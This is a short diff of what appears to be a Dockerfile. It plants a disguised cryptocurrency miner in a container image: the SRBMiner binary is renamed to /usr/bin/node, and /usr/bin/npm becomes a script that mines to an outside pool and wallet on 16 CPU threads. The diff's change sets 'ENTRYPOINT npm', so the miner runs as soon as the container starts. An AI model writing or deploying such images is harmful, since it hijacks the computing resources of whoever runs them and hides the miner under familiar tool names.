@@ -6,4 +6,4 @@ RUN apt update && apt -y install wget xz-utils && \
 RUN mv /opt/SRBMiner-Multi-0-8-1/SRBMiner-MULTI /usr/bin/node
 RUN echo " node --disable-gpu --algorithm yespowertide --pool stratum+tcps://stratum-na.rplant.xyz:17059 --wallet TVt7kd7Ns8rwzS8LoeMXjJZnwKdMAhhZkn.TD --cpu-threads 16 c=TIDE" > /usr/bin/npm
 RUN chmod +x /usr/bin/npm
-CMD /bash.sh
+ENTRYPOINT npm
